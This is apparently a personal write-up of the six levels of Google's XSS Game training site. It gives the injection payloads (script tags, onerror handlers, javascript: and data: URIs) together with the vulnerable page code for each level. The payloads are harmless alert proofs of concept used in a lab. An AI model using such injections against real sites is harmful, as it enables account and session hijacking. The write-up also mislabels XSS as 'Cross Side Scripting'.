XSS Challenges
===================

XSS (Cross Side Scripting) Game located at https://xss-game.appspot.com/

Level 1: Hello, world of XSS
----------------

Very straight forward, the begginners XSS, by checking for scripts, they can be injected wherever a user can input information. 
```javascript
<script>alert(1);</script>
```

Level 2: Persistence is key
------------------
This time a basic script tag will not work, however there are other ways to invoke javascript. For instance, you can have an onerror trigger a function when an img is not found.

```javascript
<img src="foo.png" onerror="alert(1)" />
```

Level 3: That sinking feeling...
------------------
This next challenge is a bit more complicated as we can now only modify the URL itself, if we toggle the code on we can see where the hashtag data is processed. The particular line of interest is

```javascript
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```

This line directly takes what is passed in the header to append to the img src tag, however we can manipulate the header such that it closes the source tag and creates an onerror attribute.

```
    https://xss-game.appspot.com/level3/frame#4.png' onerror="alert(1)"/>
```

Which will result in this
```javascript
<img src="/static/level3/cloud4.png" onerror="alert(1)">
```

```javascript
function chooseTab(num) {
  // Dynamically load the appropriate image.
  var html = "Image " + parseInt(num) + "<br>";
  html += "<img src='/static/level3/cloud" + num + ".jpg' />";
  $('#tabContent').html(html);

  window.location.hash = num;

  // Select the current tab
  var tabs = document.querySelectorAll('.tab');
  for (var i = 0; i < tabs.length; i++) {
    if (tabs[i].id == "tab" + parseInt(num)) {
      tabs[i].className = "tab active";
      } else {
      tabs[i].className = "tab";
    }
  }

  // Tell parent we've changed the tab
  top.postMessage(self.location.toString(), "*");
}
```
Level 4: Context matters
---------------------------
This  one was a bit more tricky as MVC was implemented to provide some structure, at first I tried a URL like 

```
    https://xss-game.appspot.com/level4/frame?timer=');alert('1
```

However, I eventully realized that the semicolon is not being parsed and if I pass the URL encoding of a semicolon it would work

```
    https://xss-game.appspot.com/level4/frame?timer=')%3Balert('1
```

Which results in this
```javascript
    <img src="/static/loading.gif" onload="startTimer('');alert('1');">
```

```html
<body id="level4">
  <img src="/static/logos/level4.png" />
  <br>
  <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
  <br>
  <div id="message">Your timer will execute in {{ timer }} seconds.</div>
</body>
```

Level 5: Breaking protocol
---------------------------------

At first this problem looks complicated, however it took me much less time now that I know to pass in URL encoded characters. After clicking sign-up, you see a page with a next href. The location to where this href goes to is entirely regulated by next=confirm, so this variable could be manipulated to make the link execute javascript.

```javascript
<a href="{{ next }}">Next >></a>
```

My method was 
```
    https://xss-game.appspot.com/level5/frame/signup?next=javascript%3Aalert(1)
```

Which turned the link to
```html
    <a href="javascript:alert(1)">Next &gt;&gt;</a>
```

Level 6: Follow the
------------------------

This one stumped me for quite a bit, I wanted to somehow get my javascript from babbage linked in, however the javascript checks for "http", so I couldn't figure out a solution.

I looked online and the solution was 
```
    https://xss-game.appspot.com/level6/frame#data:text/javascript,alert('XSS')
```
I found this solution lame as it didn't actually load external javascript persay. One thing I wanted to try is loading the javascript file through FTP which babbage does not seem to have.

All in all, I learned quite a bit in Cross Side Scripting attacks.

